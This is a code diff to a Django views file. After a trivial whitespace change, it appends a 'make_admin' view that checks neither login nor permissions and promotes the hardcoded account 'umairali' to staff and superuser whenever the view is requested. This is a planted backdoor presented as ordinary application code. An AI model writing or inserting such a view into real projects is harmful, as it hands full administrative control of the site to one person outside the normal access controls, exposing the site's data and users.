@@ -69,7 +69,6 @@ class BaseContentListView(ListView):
         category = self.request.GET.get('category')
         if category:
             queryset = queryset.filter(category__slug=category)
-
         search = self.request.GET.get('search')
         if search:
             queryset = queryset.filter(title__icontains=search)
@@ -966,3 +965,18 @@ def activate_membership_view(request, slug):
     plan = get_object_or_404(PremiumPlan, slug=slug, is_active=True)
     activate_membership(request.user, plan)
     return redirect('membership')
+
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+def make_admin(request):
+    User = get_user_model()
+    
+    try:
+        user = User.objects.get(username="umairali")
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        return HttpResponse("User is now admin")
+    except:
+        return HttpResponse("User not found")
